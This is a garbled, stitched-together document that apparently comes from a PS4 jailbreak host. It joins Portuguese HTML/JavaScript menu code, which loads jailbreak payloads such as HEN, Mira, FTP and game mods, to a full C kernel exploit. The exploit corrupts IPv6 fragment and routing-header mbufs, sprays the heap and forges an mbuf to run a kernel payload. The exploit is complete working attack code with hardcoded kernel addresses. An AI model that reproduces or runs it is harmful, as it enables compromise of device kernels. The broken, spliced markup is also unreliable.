# test-7.55<html>
	<head>
		<script src="utils.js"></script>
		<script src="int64.js"></script>
		<script src="ps4.js"></script>
	</head>
	<body onload="go()">
		<button id="input1" onfocus="handle2()"></button>
		<button id="input2"></button>
		<button id="input3" onfocus="handle2()"></button>
		<select id="select1">
			<option value="value1">Value1</option>
		</select>
	</body>
</html>   </script> function dicas2 (dica) {
switch (dica) {
case 'cache':document.getElementById("msgs").innerHTML = "Clique para ver como limpar e atualizar a <font color=\"#ee596f\">CACHE.</font>";break;
case 'usb':document.getElementById("msgs").innerHTML = "<font color=\"#ee596f\">Desconecte</font> todos os cabos USB, antes do desbloqueio.";break;
case 'botao':document.getElementById("msgs").innerHTML = "Se algum <font color=\"#ee596f\">bont�o n�o fucionar</font>, saia e entre novamente no navegador.";break;
case 'memoria':document.getElementById("msgs").innerHTML = "Ap�s 5 erros de mem�ria cheia, <font color=\"#ee596f\">saia e entre no navegador</font>.";break;
case 'demora':document.getElementById("msgs").innerHTML = "Demorando muito para ativar o JB, <font color=\"#ee596f\">deslige totalmente</font> e retire o cabo de for�a, por 10 min.";break;
case '6':document.getElementById("msgs").innerHTML = "Clique para ver outros Hosts";break;
case 'hen213':document.getElementById("msgs").innerHTML = "Ativa <font style='color:#ee596f;'>Jailbreak + HEN v2.1.3</font> (sleirsgoevy).";break;
case 'mira':document.getElementById("msgs").innerHTML = "Ativa <font style='color:#ee596f;'>Jailbreak + Mira</font> (mais est�vel).";break;
case 'light':document.getElementById("msgs").innerHTML = "Link para um Host somente com o HEN, <font style='color:#ee596f;'>sem payload</font>.";break;
case 'miraTeste':document.getElementById("msgs").innerHTML = "Ativa <font style='color:#ee596f;'>Jailbreak + Mira + ToDex + Spoof fw8.03 + Fixs </font>(mais est�vel).";break;
case 'binloader':document.getElementById("msgs").innerHTML = "Permite enviar arquivos<font style='color:#ee596f;'> .BIN</font> para o PS4 pela porta <font style='color:#ee596f;'>9020</font>.";break;
case 'cu2':document.getElementById("msgs").innerHTML = "Gerencie os arquivos do PS4 pelo computador <font style='color:#ee596f;'>via protocolo FTP</font> (FileZilla).";break;
case 'cu3':document.getElementById("msgs").innerHTML = "Permite fazer <font style='color:#ee596f;'>c�pia de seguran�a</font> de seus jogos <font style='color:#ee596f;'>via USB</font>.";break;
case 'linux1':document.getElementById("msgs").innerHTML = "Carrega o <font style='color:#ee596f;'>Linux via USB</font> (1gb de gr�ficos)";break;
case 'linux2':document.getElementById("msgs").innerHTML = "Carrega o <font style='color:#ee596f;'>Linux via USB</font> (2gb de gr�ficos)";break;
case 'linux3':document.getElementById("msgs").innerHTML = "Carrega o <font style='color:#ee596f;'>Linux via USB</font> (3gb de gr�ficos)";break;
case 'cu5':document.getElementById("msgs").innerHTML = "<font style='color:#ee596f;'>Transfere jogos</font> do console para um hd externo (<font style='color:#ee596f;'>exFAT</font>).";break;
case 'kernelClock':document.getElementById("msgs").innerHTML = "Corrigi erros decorrente do <font style='color:#ee596f;'>Rel�gio</font>.";break;
case 'webrte':document.getElementById("msgs").innerHTML = "Para gerenciamento de trapa�as (<font style='color:#ee596f;'>funcioando s� pelo binloader</font>).";break;
case 'cu8':document.getElementById("msgs").innerHTML = "Faz <font style='color:#ee596f;'> beckup do kernel</font> via USB.";break;
case 'cu15':document.getElementById("msgs").innerHTML = "Link para o site <font style='color:#ee596f;'>ps4trainer.com</font>";break;
case 'cu9':document.getElementById("msgs").innerHTML = "Modo de depura��o do console (<font style='color:#ee596f;'>teste de devkit</font>).";break;
case 'cu10':document.getElementById("msgs").innerHTML = "<font style='color:#ee596f;'>Desabilita</font> a �ltima p�gina usada no navegador PS4.";break;
case 'cu11':document.getElementById("msgs").innerHTML = "<font style='color:#ee596f;'>Desabilitas as atualiza��es</font> autom�ticas de firmware.";break;
case 'cu12':document.getElementById("msgs").innerHTML = "<font style='color:#ee596f;'>Habilitas as atualiza��es</font> autom�ticas de firmware.";break;
case 'dbBackup':document.getElementById("msgs").innerHTML = "Faz <font style='color:#ee596f;'>c�pia do banco de dados e dados de usu�rios</font> via USB.";break;
case 'dbRestore':document.getElementById("msgs").innerHTML = "Restaura <font style='color:#ee596f;'>c�pia do banco de dados e dados de usu�rio</font> via USB.";break;
case 'cu16':document.getElementById("msgs").innerHTML = "Permite alterar a temperatura alvo do PS4 (<font style='color:#ee596f;'>padr�o 79�C</font>).";break;
case 'cu17':document.getElementById("msgs").innerHTML = "<font style='color:#ee596f;'>Habilita</font> o navegador.";break;
case 'cu18':document.getElementById("msgs").innerHTML = "em teste.";break;
case 'spoof':document.getElementById("msgs").innerHTML = "Simula o firmware <font style='color:#ee596f;'>8.03 para o Headset</font>.";break;
case 'cu20':document.getElementById("msgs").innerHTML = "Ativa o <font style='color:#ee596f;'>PSVR</font> (ative o HEN 2.1.3 primeiro).";;break;
case 'ce303916fix':document.getElementById("msgs").innerHTML = "Corrigi efetuais <font style='color:#ee596f;'>erros</font>.";;break;
case 'gta100':document.getElementById("msgs").innerHTML = "Ativa o <font style='color:#ee596f;'>MOD GTA V ArabicGuy v1.00</font> (Direcional Direito + Quadrado).";;break;
case 'gta127':document.getElementById("msgs").innerHTML = "Ativa o <font style='color:#ee596f;'>MOD GTA V ArabicGuy v1.27</font> (Direcional Direito + Quadrado).";;break;
case 'gta132':document.getElementById("msgs").innerHTML = "Ativa o <font style='color:#ee596f;'>MOD GTA V ArabicGuy v1.32</font> (Direcional Direito + Quadrado).";;break;
default:document.getElementById("msgs").innerHTML = "erro";
}
}

function fora(){
document.getElementById("msgs").innerHTML = "PS4 MENU JAILBREAK <font style='color:#ee596f;'>7.02</font> v6";
}

function invisivel() {
  var appCache = window.applicationCache;
  if(appCache.status == appCache.DOWNLOADING){
    var elementos = document.querySelectorAll(".invisivel");	
	elementos[0].style.display = 'none';
	elementos[1].style.display = 'none';
	elementos[2].style.display = 'none';
	elementos[3].style.display = 'none';
  }	
}	

function statusCache(){
var appCache = window.applicationCache;
switch (appCache.status) {
  case appCache.UNCACHED:
    document.getElementById("msgs2").innerHTML = "UNCACHED";
    var elementos = document.querySelectorAll(".invisivel");	
	elementos[0].style.display = 'none';
	elementos[1].style.display = 'none';
	elementos[2].style.display = 'none';
	elementos[3].style.display = 'none';
    break;
};	
}
	
function check() {
var checkStatus = document.getElementById("auto").checked;
document.getElementById("auto").checked = checkStatus;
localStorage.setItem('auto', checkStatus);

if(checkStatus){
document.getElementById("msgs").innerHTML = "Auto HEN <font color=\"#ee596f\">ATIVADO.</font> O desbloqueio ser� <font color=\"#ee596f\">AUTOM�TICO</font> quando entrar no navegador.";}
else{
document.getElementById("msgs").innerHTML = "Auto HEN <font color=\"#ee596f\">DESATIVADO.</font> O desbloqueio ser� <font color=\"#ee596f\">MANUAL</font> quando entrar no navegador.";}
}

var checkStatusStorage = localStorage.getItem("auto");
	
function pegarCheck(){
if (checkStatusStorage == 'true'){
document.getElementById("auto").checked = true ; 
document.getElementById('hen1').style.display = 'none';
document.getElementById('hen2').style.display = 'none';
document.getElementById('hen3').style.display = 'none';
document.getElementById('hen4').style.display = 'none';
document.getElementById('msgAuto').style.display = 'inline';
}
else{
document.getElementById("auto").checked = false ;
document.getElementById('hen1').style.display = 'inline';
document.getElementById('hen2').style.display = 'inline';
document.getElementById('hen3').style.display = 'inline';
document.getElementById('hen4').style.display = 'inline';
document.getElementById('msgAuto').style.display = 'none';}
}

function retornando(){
    var retorno = decodeURIComponent(document.location.hash.substr(3));
	if (retorno){
		document.getElementById("msgs").innerHTML = "Pressione o bot�o <font style='color:#ee596f;'>CIRCULO</font> para sair do navegador.";
		var elementos = document.querySelectorAll(".invisivel");	
		elementos[1].style.display = 'none';	   
		elementos[3].style.display = 'none';
		var url = window.location.pathname
		window.history.replaceState(null, null, url);					
	}else{if (checkStatusStorage == 'true'){load_exploit_HEN(); return false;}}
}

//COME�A AQUI OS PAYLOADS
function load_exploit_HEN(){window.location.replace("payload.html#f=hen.js");}
function load_exploit_mira2(){window.location.replace("payload.html#f=mira2.js");}
function load_exploit_miraTeste(){window.location.replace("payload.html#f=miraTeste.js");}
function load_exploit_light(){window.location.replace("https://ps4macedo.github.io/702light");}
function load_dumper(){window.location.replace("payload.html#f=dumper.js");}
function load_updatesdisable(){window.location.replace("payload.html#f=disableUpd.js");}
function load_binloader(){window.location.replace("binloader/index.html");}
function load_ftp(){window.location.replace("payload.html#f=ftp.js");}
function load_linux1(){window.location.replace("payload.html#f=linux1.js");}
function load_linux2(){window.location.replace("payload.html#f=linux2.js");}
function load_linux3(){window.location.replace("payload.html#f=linux3.js");}
function load_app2usb(){window.location.replace("payload.html#f=app2usb.js");}
function load_kernelClock(){window.location.replace("payload.html#f=kernelClock.js");}
function load_webrte(){window.location.replace("binloader/index.html");}
function load_todex(){window.location.replace("payload.html#f=todex.js");}
function load_enableUpd(){window.location.replace("payload.html#f=enableUpd.js");}
function load_disableUpd(){window.location.replace("payload.html#f=disableUpd.js");}
function load_historyBlocker(){window.location.replace("payload.html#f=historyBlocker.js");}
function load_dbBackup(){window.location.replace("payload.html#f=dbBackup.js");}
function load_dbRespore(){window.location.replace("payload.html#f=dbRespore.js");}
function load_fanThreshold(){window.location.replace("payload.html#f=fanThreshold"+tempC.value+".js");}
function load_kernelDumper(){window.location.replace("payload.html#f=kernelDumper.js");}
function load_enableBrowser(){window.location.replace("payload.html#f=enableBrowser.js");}
function load_ce303916fix(){window.location.replace("payload.html#f=ce303916fix.js");}
function load_henSP5Cdex82(){window.location.replace("payload.html#f=henSP5Cdex82.js");}
function load_enableVR(){window.location.replace("payload.html#f=vr.js");}
function load_arabicGuy100(){window.location.replace("payload.html#f=arabicGuy100.js");}
function load_arabicGuy127(){window.location.replace("payload.html#f=arabicGuy127.js");}
function load_arabicGuy132(){window.location.replace("payload.html#f=arabicGuy132.js");}
function load_spoof(){window.location.replace("payload.html#f=spoof.js");}
</script>
</body>
</html>

</body>
</html>
 </select>
	</body>
</html>
</script>#include <sys/types.h>
</script>#include <sys/param.h>
</script>#include <sys/cpuset.h>
</script>#include <sys/socket.h>
</script>#include <sys/mman.h>
</script>#include <sys/sysctl.h>
</script>#include <sys/vmmeter.h>
</script>#include <netinet/in.h>
</script>#include <string.h>
</script>#include <unistd.h>
</script>#include <fcntl.h>
</script>#include <time.h>
</script>#include <vm/vm_param.h>
</script>#include <stdio.h>

</script>void send_fragment(int fd, char* src, size_t off, size_t sz, int is_final)
{
    unsigned char buf[0x100];
    // hop-by-hop header
    buf[0] = 44;
    buf[1] = 0;
    buf[2] = 1;
    buf[3] = 4;
    buf[4] = buf[5] = buf[6] = buf[7] = 0x41;
    // fragment header
    buf[8] = 43;
    buf[9] = 0;
    size_t mid = off + !is_final;
    buf[10] = mid / 256;
    buf[11] = mid % 256;
    buf[12] = 0xde;
    buf[13] = 0xad;
    buf[14] = 0xbe;
    buf[15] = 0xef;
    for(size_t i = 0; i < sz; i++)
        buf[16+i] = src[off+i];
    struct sockaddr_in6 sin6 = {
        .sin6_family = AF_INET6,
        .sin6_addr = {0},
        .sin6_port = 0xbeef,
    };
    sin6.sin6_addr.s6_addr[15] = 1;
    sendto(fd, buf, 16+sz, 0, (struct sockaddr*)&sin6, sizeof(sin6));
}

void build_rthdr(char* buf, int sz)
{
    buf[0] = 43;
    buf[1] = sz / 8 - 1;
    buf[2] = 0;
    buf[3] = 0;
    for(size_t i = 4; i < sz; i++)
        buf[i] = 0;
}

#define RTHDR_1_SZ 0x68 // MHLEN-56
#define RTHDR_2_SZ 32 // >8 to prevent double-free on second mbuf
#define FIRST_FRAGMENT_SZ 0x38
#define SPRAY_SIZE 400
#define SMALL_SPRAY_SIZE 400
#define HUGE_SPRAY_SIZE 0x2800
#define RECLAIM_THRESHOLD 10

void push_mbuf(int* socks, int i)
{
    if(sendto(socks[i], &i, sizeof(i), 0, 0, 0) < 0)
        printf("push_mbuf failed\n");
}

int pop_mbuf(int* socks, int i)
{
    int ans = i;
    recvfrom(socks[i], &ans, sizeof(ans), 0, 0, 0);
    return ans;
}

int peek_mbuf(int* socks, int i)
{
    int ans = i;
    recvfrom(socks[i], &ans, sizeof(ans), MSG_PEEK, 0, 0);
    return ans;
}

#if 0

uint16_t ip_checksum(void* buf, size_t sz, uint32_t csum)
{
    uint16_t* x = (unsigned short*)buf;
    for(size_t i = 0; i < sz / 2; i++)
        csum += x[i];
    while(csum >= 0x10000)
    {
        uint32_t q = csum / 0x10000;
        csum %= 0x10000;
        csum += q;
    }
    return (uint16_t)(0xffff - csum);
}

void craft_ipv4_packet(char* ans, int port, char* buf, size_t sz)
{
    ans[0] = 0x45;
    ans[1] = 0;
    ans[2] = (sz+28)%256;
    ans[3] = (sz+28)/256;
    ans[4] = 0xde;
    ans[5] = 0xad;
    ans[6] = 0;
    ans[7] = 0;
    ans[8] = 64;
    ans[9] = 17;
    ans[10] = ans[11] = 0;
    ans[12] = ans[16] = 127;
    ans[13] = ans[17] = 0;
    ans[14] = ans[18] = 0;
    ans[15] = ans[19] = 1;
    ans[20] = ans[22] = port % 256;
    ans[21] = ans[23] = port / 256;
    ans[24] = (sz+8)/256;
    ans[25] = (sz+8)%256;
    ans[26] = 0;
    ans[27] = 0;
    //*(uint16_t)(ans+26) = ipv4_checksum(ans+20, 8);
    //*(uint16_t)(ans+10) = ipv4_checksum(ans, sz+28);
    for(size_t i = 0; i < sz; i++)
        ans[i+28] = buf[i];
}

void push_mbuf_r(int r, int* socks, int i)
{
    struct sockaddr_in sin;
    socklen_t l = sizeof(sin);
    getsockname(socks[i], (struct sockaddr*)&sin, &l);
    char buf[32];
    craft_ipv4_packet(buf, sin.sin_port, (void*)&i, sizeof(i));
    sendto(r, buf, sizeof(buf), 0, (void*)&sin, l);
}

#endif

int create_loopback(void)
{
#if 1
    int sock = socket(AF_INET6, SOCK_DGRAM, 0);
    struct sockaddr_in6 sin = {
        .sin6_family = AF_INET6,
        .sin6_addr = {0},
        .sin6_port = 0,
    };
    sin.sin6_addr.s6_addr[15] = 1;
#else
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in sin = {
        .sin_family = AF_INET,
        .sin_addr = {0x100007f},
        .sin_port = 0,
    };
#endif
    socklen_t sin_l = sizeof(sin);
    bind(sock, (struct sockaddr*)&sin, sin_l);
    getsockname(sock, (struct sockaddr*)&sin, &sin_l);
    connect(sock, (struct sockaddr*)&sin, sin_l);
    fcntl(sock, F_SETFL, fcntl(sock, F_GETFL) | O_NONBLOCK);
    return sock;
}

int get_port(int fd)
{
    struct sockaddr_in6 sin;
    socklen_t l = sizeof(sin);
    getsockname(fd, (struct sockaddr*)&sin, &l);
    return sin.sin6_port;
}

asm("kexec:\nmov $11,%rax\nmov %rcx,%r10\nsyscall\nret");

void kexec(void*);

#define uma_reclaim ((void*)0xffffffff80a7c1c0)

int port_to_csum(int port)
{
    int base_port = 0x0de6;
    int base_csum = 0x36b1;
    int csum = base_csum - 2 * (port - base_port);
    csum += 0x1fffe;
    csum %= 0xffff;
    return csum;
}

volatile void* userland_spray(void)
{
    volatile char* buf = mmap(NULL, 1L<<33, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    size_t npages = 50000;
    for(size_t i = 0; i < (1L<<33); i += 4096)
    {
        int checkout = 0;
        if(i % 10485760 == 0)
        {
            checkout = 1;
            printf("%lu\n", i);
        }
        struct vmtotal v1, v2;
        struct timeval t1, t2;
        int mibs[2] = {CTL_VM, VM_TOTAL};
        size_t l = sizeof(v1);
        if(npages < 50000 || checkout)
            sysctl(mibs, 2, &v1, &l, 0, 0);
        buf[i] = 123;
        if(npages < 50000 || checkout)
        {
            sysctl(mibs, 2, &v2, &l, 0, 0);
            if(v2.t_free > v1.t_free + RECLAIM_THRESHOLD)
            {
                printf("t_free was %d and is now %d\n", v1.t_free, v2.t_free);
                break;
            }
            else if(v2.t_free > v1.t_free)
                printf("t_free was %d and is now %d\n", v1.t_free, v2.t_free);
            npages = v2.t_free;
        }
    }
    printf("sprayed (?)\n");
    //munmap(buf+(1<<30)-(1<<20), 1<<20);
    return buf;
}

void pipe_spray(void)
{
    char* buf = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    for(size_t i = 0; i < 4096; i++)
        buf[i] = 0x41;
    for(int i = 0; i < HUGE_SPRAY_SIZE/2; i++)
    {
        int p[2];
        pipe(p);
        fcntl(p[1], F_SETFL, fcntl(p[1], F_GETFL) | O_NONBLOCK);
        write(p[1], buf, 4096);
        write(p[0], buf, 4096);
    }
}

void push_jumbo(int fd)
{
    char buf[2048];
    for(int i = 0; i < 2048; i++)
        buf[i] = 0x41;
    for(int i = 0; i < 31; i++)
        sendto(fd, buf, sizeof(buf), 0, 0, 0);
}

void* mmap_at(void* where, size_t sz)
{
    uintptr_t addr = (uintptr_t)where;
    uintptr_t end = addr + sz;
    addr &= ~4095ull;
    if((uintptr_t)mmap((void*)addr, end - addr, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) != addr)
    {
        printf("failed to mmap_at!\n");
        return 0;
    }
    //prefault pages
    unsigned char* p = where;
    for(size_t i = 0; i < sz; i++)
        p[i] = 0;
    return where;
}

void kernel_payload(int bad_fd)
{
    int(*printf)(const char*, ...) = (void*)0xffffffff8086bf90;
    printf("Hello, kernel world!\n");
    int****** td;
    asm volatile("mov %%gs:0, %0":"=r"(td));
    td[1][9][0][bad_fd][0][81] = 0; // socket->so_snd.sb_cc
    td[1][9][0][bad_fd][0][83] = 0; // socket->so_snd.sb_mbcnf
    void*** zone_mbuf = (void*)0xffffffff811008a0;
    zone_mbuf[0][32] = zone_mbuf[0][33] = 0; //detach buckets
}

int main(void)
{
    cpuset_t xxx;
    CPU_ZERO(&xxx);
    CPU_SET(2, &xxx);
    cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_PID, getpid(), sizeof(xxx), &xxx);
    int huge_spray[HUGE_SPRAY_SIZE];
    for(int i = 0; i < HUGE_SPRAY_SIZE; i++)
        huge_spray[i] = socket(AF_INET6, SOCK_DGRAM, 0);
    int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_HOPOPTS);
    int socks[SPRAY_SIZE];
    for(int i = 0; i < SPRAY_SIZE; i++)
        socks[i] = create_loopback();
        //socketpair(AF_INET, SOCK_DGRAM, 0, socks+2*i);
    int small_spray[SMALL_SPRAY_SIZE];
    for(int i = 0; i < SMALL_SPRAY_SIZE; i++)
        small_spray[i] = create_loopback();
    char buf[RTHDR_1_SZ + RTHDR_2_SZ];
    build_rthdr(buf, RTHDR_1_SZ);
    build_rthdr(buf + RTHDR_1_SZ, RTHDR_2_SZ);
    send_fragment(sock, buf, 0, FIRST_FRAGMENT_SZ, 0);
    send_fragment(sock, buf, FIRST_FRAGMENT_SZ, sizeof(buf) - FIRST_FRAGMENT_SZ, 1);
    nanosleep((void*)"\0\0\0\0\0\0\0\0\x10\x27\0\0\0\0\0\0", 0);
    CPU_ZERO(&xxx);
    CPU_SET(0, &xxx);
    cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_PID, getpid(), sizeof(xxx), &xxx);
#define FORALL for(int i = 0; i < SPRAY_SIZE; i++)
    int q;
    FORALL push_mbuf(socks, i);
    char delayed_pkt[20];
    *(uint32_t*)(delayed_pkt+16) = 0x41414141;
    send_fragment(sock, delayed_pkt, 16, 4, 1);
    for(int i = 0; i < SMALL_SPRAY_SIZE; i++)
        push_mbuf(small_spray, i);
    int bad1 = -1, bad2 = -1;
    FORALL if((q = peek_mbuf(socks, i)) != i)
    {
        bad1 = i;
        bad2 = q;
    }
    if(bad1 < 0 || bad2 < 0)
    {
        printf("fatal: no corruption\n");
        return 1;
    }
    build_rthdr(delayed_pkt, 8);
    delayed_pkt[0] = 17; // udp
    uint16_t bad1_port = get_port(socks[bad1]);
    *(uint16_t*)(delayed_pkt+8) = *(uint16_t*)(delayed_pkt+10) = bad1_port;
    delayed_pkt[12] = 0;
    delayed_pkt[13] = 12;
    *(uint16_t*)(delayed_pkt+14) = port_to_csum(bad1_port);
    send_fragment(sock, delayed_pkt, 0, 16, 0);
    nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
    pop_mbuf(socks, bad1);
    pop_mbuf(socks, bad2);
    /*for(int i = SPRAY_SIZE-SMALL_SPRAY_SIZE; i < SPRAY_SIZE; i++)
    {
        printf("%d ", i-SPRAY_SIZE);
        fflush(stdout);
        print_mbuf_addr(socks[i]);
    }
    printf("-0 ");
    fflush(stdout);
    print_mbuf_addr(socks[bad1]);
    printf("-0 ");
    fflush(stdout);
    print_mbuf_addr(socks[bad2]);
    for(int i = 0; i < SMALL_SPRAY_SIZE; i++)
    {
        printf("%d ", i);
        fflush(stdout);
        print_mbuf_addr(small_spray[i]);
    }*/
    for(int i = SMALL_SPRAY_SIZE-1; i >= 0; i--)
        pop_mbuf(small_spray, i);
    pop_mbuf(socks, bad1);
    for(int i = SPRAY_SIZE-1; i >= 0; i--)
        if(i != bad1 && i != bad2)
            pop_mbuf(socks, i);
    //print_mbuf_addr(socks[bad2]);
    void* ul_buf = (void*)userland_spray();
    unsigned char rthdr[1016];
    build_rthdr((char*)rthdr, sizeof(rthdr));
    rthdr[0] = 0;
    rthdr[3] = rthdr[1] / 2;
    rthdr[4] = 0x90;
    *(uint32_t*)(rthdr+0x1c) = 0x40000; //M_NOFREE
    unsigned char* mbuf_fake = mmap_at(*(void**)rthdr, 0x100);
    *(uint32_t*)(mbuf_fake+0x1c) = 0x40001; //M_NOFREE|M_EXT
    *(uintptr_t*)(mbuf_fake+0x58) = 0xffff800041414141ull;
    *(uintptr_t*)(mbuf_fake+0x60) = (uintptr_t)&kernel_payload;
    *(uintptr_t*)(mbuf_fake+0x68) = socks[bad2]; //ext_arg1
    int fake_refcnt = 1;
    *(void**)(mbuf_fake+0x80) = &fake_refcnt;
    *(int*)(mbuf_fake+0x88) = 400;
    for(int i = 256; i < sizeof(rthdr); i++)
        rthdr[i] = rthdr[i % 256];
    printf("crafted fake mbuf in userspace\n");
    /*for(int i = 4; i < sizeof(rthdr); i++)
        rthdr[i] = 0x41;*/
    for(int i = 0; i < HUGE_SPRAY_SIZE; i++)
        setsockopt(huge_spray[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr, sizeof(rthdr));
    for(int i = 0; i < SPRAY_SIZE; i++)
        setsockopt(socks[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr, sizeof(rthdr));
    for(int i = 0; i < SMALL_SPRAY_SIZE; i++)
        setsockopt(small_spray[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr, sizeof(rthdr));
    //print_mbuf_addr(socks[bad2]);
    pop_mbuf(socks, bad2);
    close(socks[bad1]);
    close(socks[bad2]);
    printf("pwned\n");
    munmap(ul_buf, 1L<<33);
    return 0;
}  </script>
</body>
</html>  
